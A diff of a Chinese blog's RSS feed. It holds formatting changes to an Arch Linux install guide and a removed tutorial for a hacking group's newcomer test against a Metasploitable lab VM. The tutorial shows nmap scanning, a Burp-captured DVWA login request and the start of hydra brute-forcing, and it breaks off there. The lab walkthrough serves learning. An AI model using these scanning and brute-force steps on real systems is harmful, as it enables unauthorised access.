+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-txt&#34; data-lang=&#34;txt&#34;&gt;# vim /etc/sudoers
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;将你的用户名添加到 &lt;code&gt;root&lt;/code&gt; 的下面,照抄即可&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-txt&#34; data-lang=&#34;txt&#34;&gt;# Defaults!/usr/bin/sudoreplay !log_output
 # Defaults!/usr/local/bin/sudoreplay !log_output
 # Defaults!REBOOT !log_output
 
@@ -1123,17 +1548,17 @@ rtt min/avg/max/mdev = 110.224/112.036/114.157/1.355 ms
 ##
 root ALL=(ALL) ALL
 &amp;lt;用户名&amp;gt; ALL=(ALL) ALL
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;重启即可登录普通用户了.&lt;/p&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;重启即可登录普通用户了.&lt;/p&gt;
 &lt;h3 id=&#34;安装图形界面&#34;&gt;安装图形界面&lt;/h3&gt;
 &lt;p&gt;在安装图形界面之前,我们需要安装的是 xorg , 它是大多数图形界面的依赖&amp;hellip;&lt;/p&gt;
 &lt;p&gt;算了,这么一大堆说完肯定&amp;hellip;.直接一套安排上吧(xfce)&lt;/p&gt;
 &lt;p&gt;安装软件包&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;$ sudo pacman -S xorg xfce4 lightdm lightdm-greeter-gtk
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;设置lightdm启动权限&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;$ sudo systemctl enable lightdm
-&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;安装显卡驱动&#34;&gt;安装显卡驱动&lt;/h3&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-txt&#34; data-lang=&#34;txt&#34;&gt;$ sudo pacman -S xorg xfce4 lightdm lightdm-greeter-gtk
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;设置lightdm启动权限&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-txt&#34; data-lang=&#34;txt&#34;&gt;$ sudo systemctl enable lightdm
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;安装显卡驱动&#34;&gt;安装显卡驱动&lt;/h3&gt;
 &lt;p&gt;显卡驱动软件包列表.&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;extra/xf86-video-amdgpu 19.1.0-2 (xorg-drivers) 
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-txt&#34; data-lang=&#34;txt&#34;&gt;extra/xf86-video-amdgpu 19.1.0-2 (xorg-drivers) 
     X.org amdgpu video driver
 extra/xf86-video-ati 1:19.1.0-2 (xorg-drivers)
     X.org ati video driver
@@ -1157,14 +1582,14 @@ extra/xf86-video-voodoo 1.2.5-11 (xorg-drivers)
     X.org 3dfx Voodoo1/Voodoo2 2D video driver
 community/xf86-video-qxl 0.1.5-7 (xorg-drivers)
     Xorg X11 qxl video driver
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;vesa 会自动装上, 自己是什么显卡就装什么, 不需要过多解释了吧&amp;hellip;&lt;/p&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;vesa 会自动装上, 自己是什么显卡就装什么, 不需要过多解释了吧&amp;hellip;&lt;/p&gt;
 &lt;p&gt;Intel 核显&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;$ sudo pacman -S xf86-video-intel
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;NVIDIA&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;$ sudo pacman -S xf86-video-nouveau
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;AMD&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;$ sudo pacman -S xf86-video-amdgpu
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;好啦 装完啦~&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-txt&#34; data-lang=&#34;txt&#34;&gt;$ sudo pacman -S xf86-video-intel
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;NVIDIA&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-txt&#34; data-lang=&#34;txt&#34;&gt;$ sudo pacman -S xf86-video-nouveau
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;AMD&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-txt&#34; data-lang=&#34;txt&#34;&gt;$ sudo pacman -S xf86-video-amdgpu
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;好啦 装完啦~&lt;/p&gt;
 &lt;p&gt;接下来系统就可以使用啦~&lt;/p&gt;
 - https://weepingdogel.github.io/posts/%E6%80%8E%E6%A0%B7%E5%AE%89%E8%A3%85arch_linux/ - WeepingDogel 本站遵循 CC-BY-NC 4.0 协议</description>
         </item>
@@ -1588,782 +2013,6 @@ community/xf86-video-qxl 0.1.5-7 (xorg-drivers)
 &lt;p&gt;根据…&lt;/p&gt;
 &lt;/blockquote&gt;
 - https://weepingdogel.github.io/posts/%E7%AC%94%E8%AE%B0%E6%95%B4%E7%90%86_%E5%B0%86%E6%9D%A5%E8%BF%9B%E8%A1%8C%E6%97%B6/ - WeepingDogel 本站遵循 CC-BY-NC 4.0 协议</description>
-        </item>
-    
-    
-    
-        <item>
-        <title>锏幕 新人四项考核教程</title>
-        <link>https://weepingdogel.github.io/posts/%E9%94%8F%E5%B9%95-%E6%96%B0%E4%BA%BA%E5%9B%9B%E9%A1%B9%E8%80%83%E6%A0%B8%E6%95%99%E7%A8%8B/</link>
-        <pubDate>Sun, 20 Oct 2019 23:44:37 +0800</pubDate>
-        
-        <guid>https://weepingdogel.github.io/posts/%E9%94%8F%E5%B9%95-%E6%96%B0%E4%BA%BA%E5%9B%9B%E9%A1%B9%E8%80%83%E6%A0%B8%E6%95%99%E7%A8%8B/</guid>
-        <description>WeepingDogel&#39;s Blog https://weepingdogel.github.io/posts/%E9%94%8F%E5%B9%95-%E6%96%B0%E4%BA%BA%E5%9B%9B%E9%A1%B9%E8%80%83%E6%A0%B8%E6%95%99%E7%A8%8B/ -&lt;p&gt;&lt;strong&gt;注意事项：本期内容中的IP地址可能与你的实际情况不同！！请根据实际情况更改对应IP地址！！&lt;/strong&gt;&lt;/p&gt;
-&lt;h2 id=&#34;开场白&#34;&gt;开场白&lt;/h2&gt;
-&lt;p&gt;诶嘿～！我又回来了，我看到很多萌新不知道怎么过锏幕的新人考核，特意为此写篇博客做个教程。&lt;/p&gt;
-&lt;p&gt;好让你们看完过一下，那么…&lt;/p&gt;
-&lt;p&gt;嘛.. 我们开始吧..&lt;/p&gt;
-&lt;h2 id=&#34;考核内容&#34;&gt;考核内容&lt;/h2&gt;
-&lt;table&gt;
-&lt;thead&gt;
-&lt;tr&gt;
-&lt;th style=&#34;text-align:center&#34;&gt;类型&lt;/th&gt;
-&lt;th style=&#34;text-align:left&#34;&gt;内容&lt;/th&gt;
-&lt;th style=&#34;text-align:left&#34;&gt;备注&lt;/th&gt;
-&lt;/tr&gt;
-&lt;/thead&gt;
-&lt;tbody&gt;
-&lt;tr&gt;
-&lt;td style=&#34;text-align:center&#34;&gt;名称&lt;/td&gt;
-&lt;td style=&#34;text-align:left&#34;&gt;锏幕四项萌新考核&lt;/td&gt;
-&lt;td style=&#34;text-align:left&#34;&gt;考核的名称&lt;/td&gt;
-&lt;/tr&gt;
-&lt;tr&gt;
-&lt;td style=&#34;text-align:center&#34;&gt;难度&lt;/td&gt;
-&lt;td style=&#34;text-align:left&#34;&gt;Low&lt;/td&gt;
-&lt;td style=&#34;text-align:left&#34;&gt;难度系数&lt;/td&gt;
-&lt;/tr&gt;
-&lt;tr&gt;
-&lt;td style=&#34;text-align:center&#34;&gt;第一关&lt;/td&gt;
-&lt;td style=&#34;text-align:left&#34;&gt;简单破解Web表单&lt;/td&gt;
-&lt;td style=&#34;text-align:left&#34;&gt;必须通过，否则无法进行下一关&lt;/td&gt;
-&lt;/tr&gt;
-&lt;tr&gt;
-&lt;td style=&#34;text-align:center&#34;&gt;第二关&lt;/td&gt;
-&lt;td style=&#34;text-align:left&#34;&gt;简单SQL注入&lt;/td&gt;
-&lt;td style=&#34;text-align:left&#34;&gt;必须通过&lt;/td&gt;
-&lt;/tr&gt;
-&lt;tr&gt;
-&lt;td style=&#34;text-align:center&#34;&gt;第三关&lt;/td&gt;
-&lt;td style=&#34;text-align:left&#34;&gt;操作系统渗透&lt;/td&gt;
-&lt;td style=&#34;text-align:left&#34;&gt;必须通过&lt;/td&gt;
-&lt;/tr&gt;
-&lt;tr&gt;
-&lt;td style=&#34;text-align:center&#34;&gt;第四关&lt;/td&gt;
-&lt;td style=&#34;text-align:left&#34;&gt;获取root权限&lt;/td&gt;
-&lt;td style=&#34;text-align:left&#34;&gt;必须通过&lt;/td&gt;
-&lt;/tr&gt;
-&lt;/tbody&gt;
-&lt;/table&gt;
-&lt;p&gt;&lt;strong&gt;PS：锏幕组织的新人考核是以metasploitable作为标准的，因此我会写出如何准备环境&lt;/strong&gt;&lt;/p&gt;
-&lt;h2 id=&#34;环境准备&#34;&gt;环境准备&lt;/h2&gt;
-&lt;p&gt;上面已经说明了需要用到&lt;strong&gt;metasploitable&lt;/strong&gt;，那么接下来我会写出如何配置靶机环境&lt;/p&gt;
-&lt;h3 id=&#34;第一步下载解压&#34;&gt;第一步|下载&amp;amp;解压&lt;/h3&gt;
-&lt;p&gt;首先我们需要去下载metasploitable这个靶机套餐的虚拟机文件，我们可以在各种搜索引擎中找到它我这里会给出地址。&lt;/p&gt;
-&lt;p&gt;&lt;a href=&#34;https://sourceforge.net/projects/metasploitable/&#34;&gt;点击这里可以下载&lt;/a&gt;&lt;/p&gt;
-&lt;p&gt;点进去以后点击那个巨大的&lt;strong&gt;Download&lt;/strong&gt;即可下载。&lt;/p&gt;
-&lt;p&gt;嘛..我已经下载好了，是个&lt;strong&gt;zip&lt;/strong&gt;文件。&lt;/p&gt;
-&lt;p&gt;然后你需要解压，两种方法:&lt;/p&gt;
-&lt;ul&gt;
-&lt;li&gt;Linux
-&lt;ul&gt;
-&lt;li&gt;unzip命令&lt;/li&gt;
-&lt;li&gt;file-roller(GUI)&lt;/li&gt;
-&lt;/ul&gt;
-&lt;/li&gt;
-&lt;li&gt;Windows
-&lt;ul&gt;
-&lt;li&gt;各种解压软件&lt;/li&gt;
-&lt;/ul&gt;
-&lt;/li&gt;
-&lt;/ul&gt;
-&lt;p&gt;这个不用多说吧..&lt;/p&gt;
-&lt;p&gt;&lt;strong&gt;解压个东西都不会还想加入锏幕?&lt;/strong&gt;&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://weepingdogel.github.io/img/%E6%88%AA%E5%9B%BE_2019-10-20_05-52-55.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
-&lt;p&gt;解压完了就可以进行下一步了。&lt;/p&gt;
-&lt;h3 id=&#34;第二步创建虚拟机&#34;&gt;第二步|创建虚拟机&lt;/h3&gt;
-&lt;p&gt;你打开文件夹就可以看到这里面有个虚拟机配置文件和一个虚拟硬盘文件，它可以直接用VMware导入运行，因此我这里给出VirtualBox的方法&lt;/p&gt;
-&lt;p&gt;首先，打开你的VirtualBox&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://weepingdogel.github.io/img/%E6%88%AA%E5%9B%BE_2019-10-20_05-58-44.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
-&lt;p&gt;然后点击上面的新建…(这个还要教吗?)&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://weepingdogel.github.io/img/%E6%88%AA%E5%9B%BE_2019-10-20_05-59-53.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
-&lt;p&gt;然后选择的虚拟机类型和操作系统版本，&lt;strong&gt;这里要注意！！必须选“64位的其他Linux”，并且设置至少256MB的内存！否则无法启动！&lt;/strong&gt;
-&lt;img src=&#34;https://weepingdogel.github.io/img/%E6%88%AA%E5%9B%BE_2019-10-20_06-00-34.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://weepingdogel.github.io/img/%E6%88%AA%E5%9B%BE_2019-10-20_06-02-10.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
-&lt;p&gt;然后这里就&lt;strong&gt;不用创建虚拟硬盘&lt;/strong&gt;了，我们选择&lt;strong&gt;使用现有的虚拟硬盘文件&lt;/strong&gt;。&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://weepingdogel.github.io/img/%E6%88%AA%E5%9B%BE_2019-10-20_06-04-29.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
-&lt;p&gt;点击这个东西，&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://weepingdogel.github.io/img/%E6%88%AA%E5%9B%BE_2019-10-20_06-05-21.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
-&lt;p&gt;然后点击&lt;strong&gt;注册&lt;/strong&gt;&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://weepingdogel.github.io/img/%E6%88%AA%E5%9B%BE_2019-10-20_06-07-17.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
-&lt;p&gt;找到你的&lt;strong&gt;metasploitable&lt;/strong&gt;目录并且找到这个&lt;strong&gt;vmdk文件&lt;/strong&gt;，这个就是虚拟硬盘文件。&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://weepingdogel.github.io/img/%E6%88%AA%E5%9B%BE_2019-10-20_06-08-57.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
-&lt;p&gt;点击打开，然后就会回到这个窗口，选择你刚刚注册的虚拟硬盘。&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://weepingdogel.github.io/img/%E6%88%AA%E5%9B%BE_2019-10-20_06-11-10.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
-&lt;p&gt;接下来就可以创建了&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://weepingdogel.github.io/img/%E6%88%AA%E5%9B%BE_2019-10-20_06-12-03.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
-&lt;p&gt;&lt;strong&gt;在启动之前要把虚拟机的联网改成桥接&lt;/strong&gt;&lt;/p&gt;
-&lt;p&gt;&lt;strong&gt;依次点击设置——网络&lt;/strong&gt;&lt;/p&gt;
-&lt;p&gt;然后就会跳出这个页面&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://weepingdogel.github.io/img/%E6%88%AA%E5%9B%BE_2019-10-20_06-16-46.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
-&lt;p&gt;将它改成桥接网卡即可&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://weepingdogel.github.io/img/%E6%88%AA%E5%9B%BE_2019-10-20_06-17-25.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
-&lt;p&gt;最后启动虚拟机，你的靶机环境就搭建完成了。
-&lt;img src=&#34;https://weepingdogel.github.io/img/%E6%88%AA%E5%9B%BE_2019-10-20_06-12-40.png&#34; alt=&#34;&#34;&gt;
-&lt;img src=&#34;https://weepingdogel.github.io/img/%E6%88%AA%E5%9B%BE_2019-10-20_06-18-39.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
-&lt;p&gt;开机之后&lt;strong&gt;不要去操作靶机&lt;/strong&gt;也&lt;strong&gt;不要去理会它&lt;/strong&gt;&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://weepingdogel.github.io/img/%E6%88%AA%E5%9B%BE_2019-10-20_06-19-35.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
-&lt;h2 id=&#34;考核过程&#34;&gt;考核过程&lt;/h2&gt;
-&lt;p&gt;现在环境已经准备完毕了，我们可以开始进行过关了。接下来请&lt;strong&gt;认真看！认真看！认真看！&lt;/strong&gt;（重要的事情说三遍）&lt;/p&gt;
-&lt;h3 id=&#34;嗅探扫描&#34;&gt;嗅探！扫描！&lt;/h3&gt;
-&lt;p&gt;我们刚刚搭建完靶机却不知道它的&lt;strong&gt;IP地址&lt;/strong&gt;，这意味着我们不知道&lt;strong&gt;它的位置&lt;/strong&gt;，那么怎么办呢？这个时候我们要用到&lt;strong&gt;nmap&lt;/strong&gt;把他扫出来。&lt;/p&gt;
-&lt;p&gt;不过前提是首先你得知道你所处的IP段，我的环境是局域网，DHCP地址段是&lt;code&gt;192.168.0.1/24&lt;/code&gt;&lt;/p&gt;
-&lt;p&gt;执行&lt;/p&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;$ sudo nmap -v -O 192.168.0.1/24
-!&lt;span style=&#34;color:#f92672&#34;&gt;[](&lt;/span&gt;/img/截图_2019-10-20_06-27-08.png&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;可以发现它很快就扫出来了&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://weepingdogel.github.io/img/%E6%88%AA%E5%9B%BE_2019-10-20_06-31-32.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
-&lt;p&gt;终端里获取到的信息如下，说明这个192.168.0.107就是靶机的地址&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;Nmap scan report for 192.168.0.107
-Host is up (0.00028s latency).
-Not shown: 977 closed ports
-PORT     STATE SERVICE
-21/tcp   open  ftp
-22/tcp   open  ssh
-23/tcp   open  telnet
-25/tcp   open  smtp
-53/tcp   open  domain
-80/tcp   open  http
-111/tcp  open  rpcbind
-139/tcp  open  netbios-ssn
-445/tcp  open  microsoft-ds
-512/tcp  open  exec
-513/tcp  open  login
-514/tcp  open  shell
-1099/tcp open  rmiregistry
-1524/tcp open  ingreslock
-2049/tcp open  nfs
-2121/tcp open  ccproxy-ftp
-3306/tcp open  mysql
-5432/tcp open  postgresql
-5900/tcp open  vnc
-6000/tcp open  X11
-6667/tcp open  irc
-8009/tcp open  ajp13
-8180/tcp open  unknown
-MAC Address: 08:00:27:3F:40:18 (Oracle VirtualBox virtual NIC)
-Device type: general purpose
-Running: Linux 2.6.X
-OS CPE: cpe:/o:linux:linux_kernel:2.6
-OS details: Linux 2.6.9 - 2.6.33
-Uptime guess: 0.002 days (since Sun Oct 20 06:23:17 2019)
-Network Distance: 1 hop
-TCP Sequence Prediction: Difficulty=192 (Good luck!)
-IP ID Sequence Generation: All zeros
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;那么我已经找到靶机了，接下来就可以正式进行攻击了。&lt;/p&gt;
-&lt;h3 id=&#34;第一关简单破解web表单&#34;&gt;第一关|简单破解Web表单&lt;/h3&gt;
-&lt;p&gt;接下来我们在浏览器输入刚刚扫描到的地址，就可以进入靶机上的网页了。&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://weepingdogel.github.io/img/%E6%88%AA%E5%9B%BE_2019-10-20_06-41-20.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
-&lt;blockquote&gt;
-&lt;p&gt;小白：唔？为什么你的IP不是上面写的107了，变成4了&lt;/p&gt;
-&lt;p&gt;回答：我写着写着就断网了，搭建了一个虚拟局域网，所以靶机IP变了，又重新扫了一遍。。但是正常情况下，这个IP是不会变的，所以请无视这个地址具体是多少了，每个人都不一样的。&lt;/p&gt;
-&lt;/blockquote&gt;
-&lt;p&gt;接下来我们点击&lt;strong&gt;DVWA&lt;/strong&gt;，进入了一个这样的帐号密码登录页面，我们第一关的目的就是破解它。&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://weepingdogel.github.io/img/%E6%88%AA%E5%9B%BE_2019-10-20_06-45-23.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
-&lt;p&gt;QwQ，然后..是不是到这里就一脸懵逼了&lt;/p&gt;
-&lt;h4 id=&#34;抓包&#34;&gt;抓包&lt;/h4&gt;
-&lt;p&gt;嘛，记得&lt;strong&gt;Burpsuite&lt;/strong&gt;吗？&lt;/p&gt;
-&lt;p&gt;就是一个java写的软件&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://weepingdogel.github.io/img/%E6%88%AA%E5%9B%BE_2019-10-20_06-51-38.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
-&lt;p&gt;试试？&lt;/p&gt;
-&lt;p&gt;在使用Burpsuite之前，你需要给浏览器设置burp的代理，我这里使用的是firefox&lt;/p&gt;
-&lt;p&gt;那么，在burpsuite里面依次点击&lt;/p&gt;
-&lt;p&gt;&lt;code&gt;Proxy（左上角内个）——Options&lt;/code&gt;&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://weepingdogel.github.io/img/%E6%88%AA%E5%9B%BE_2019-10-20_06-56-54.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
-&lt;p&gt;从这里我们就获得了burp默认的代理地址&lt;code&gt;127.0.0.1:8080&lt;/code&gt;&lt;/p&gt;
-&lt;p&gt;接下来要到浏览器里设置它，&lt;/p&gt;
-&lt;p&gt;简单地给出截图吧&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://weepingdogel.github.io/img/%E6%88%AA%E5%9B%BE_2019-10-20_07-02-05.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://weepingdogel.github.io/img/%E6%88%AA%E5%9B%BE_2019-10-20_07-03-59.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
-&lt;p&gt;然后点确定，就这样设置好了&lt;/p&gt;
-&lt;p&gt;嘛…&lt;strong&gt;浏览器都不会用&lt;/strong&gt;的也别来锏幕了&lt;/p&gt;
-&lt;p&gt;然后回到burp，确认一下这个&lt;strong&gt;Intercept&lt;/strong&gt;是否为&lt;strong&gt;on&lt;/strong&gt;，如果是就进行下一步操作，如果不是就点一下。。。&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://weepingdogel.github.io/img/%E6%88%AA%E5%9B%BE_2019-10-20_07-06-34.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
-&lt;p&gt;接下来，回到浏览器&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://weepingdogel.github.io/img/%E6%88%AA%E5%9B%BE_2019-10-20_07-09-10.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
-&lt;p&gt;emmmm….我们知道一般网站的默认管理员帐号都是&lt;strong&gt;admin&lt;/strong&gt;，这里也不例外，接下来我们试着在Username这个框框里输入&lt;code&gt;admin&lt;/code&gt;，&lt;strong&gt;Password&lt;/strong&gt;这个框框里随便输入点什么&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://weepingdogel.github.io/img/%E6%88%AA%E5%9B%BE_2019-10-20_07-11-43.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
-&lt;p&gt;然后点击&lt;strong&gt;login&lt;/strong&gt;。&lt;/p&gt;
-&lt;p&gt;接下来我们就抓取到了这个数据包了，下面还有我输入过的信息&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://weepingdogel.github.io/img/%E6%88%AA%E5%9B%BE_2019-10-20_07-13-04.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-http&#34; data-lang=&#34;http&#34;&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;POST&lt;/span&gt; /dvwa/login.php &lt;span style=&#34;color:#66d9ef&#34;&gt;HTTP&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1.1&lt;/span&gt;
-Host&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;192.168.0.4&lt;/span&gt;
-User-Agent&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;Mozilla/5.0 (X11; Linux i586; rv:31.0) Gecko/20100101 Firefox/31.0&lt;/span&gt;
-Accept&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&lt;/span&gt;
-Accept-Language&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2&lt;/span&gt;
-Accept-Encoding&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;gzip, deflate&lt;/span&gt;
-Content-Type&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;application/x-www-form-urlencoded&lt;/span&gt;
-Content-Length&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;46&lt;/span&gt;
-Connection&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;close&lt;/span&gt;
-Referer&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;http://192.168.0.4/dvwa/login.php&lt;/span&gt;
-Cookie&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;security=high; PHPSESSID=091eeaf25f53c1c6c6dd230cd5add7be&lt;/span&gt;
-Upgrade-Insecure-Requests&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;
-
-username=admin&amp;amp;password=6666666666&amp;amp;Login=Login
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;嘛…这么一大堆看着都头晕&lt;/p&gt;
-&lt;p&gt;诶嘿，其实这里你只需要保存这一部分就可以了&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;username=admin&amp;amp;password=6666666666&amp;amp;Login=Login
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;嘛，上面这点还不够呢，还需要获取一段信息。&lt;/p&gt;
-&lt;p&gt;现在网页看起来像时间停止了一样一动不动的对不对？&lt;/p&gt;
-&lt;p&gt;那么我来解释一下burp这里三个按钮的意思&lt;/p&gt;
-&lt;ul&gt;
-&lt;li&gt;Forward:放行，让网页继续执行抓到的数据包&lt;/li&gt;
-&lt;li&gt;Drop:丢弃，将这个数据包扔了，网页就执行不了了&lt;/li&gt;
-&lt;/ul&gt;
-&lt;p&gt;现在，我们点击&lt;code&gt;Forward&lt;/code&gt;，放行这个数据包&lt;/p&gt;
-&lt;p&gt;这时，网页下面弹出了一段字符串&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://weepingdogel.github.io/img/%E6%88%AA%E5%9B%BE_2019-10-20_07-26-23.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
-&lt;p&gt;码下来，一会儿要用到的&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;Login failed
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;接下来把burpsuite关掉，浏览器代理关掉，这个不多说步骤了。&lt;/p&gt;
-&lt;p&gt;嗯…整个抓包的过程就完成了。然后就是进行&lt;strong&gt;爆破&lt;/strong&gt;了&lt;/p&gt;
-&lt;h4 id=&#34;爆破&#34;&gt;爆破&lt;/h4&gt;
-&lt;p&gt;嘛…最精彩的部分来了&lt;/p&gt;
-&lt;p&gt;你知道&lt;strong&gt;hydra&lt;/strong&gt;吗？如果不知道那么请出门左转用搜索引擎查一下。&lt;/p&gt;
-&lt;p&gt;我们要给hydra设置这么几个参数&lt;/p&gt;
-&lt;ul&gt;
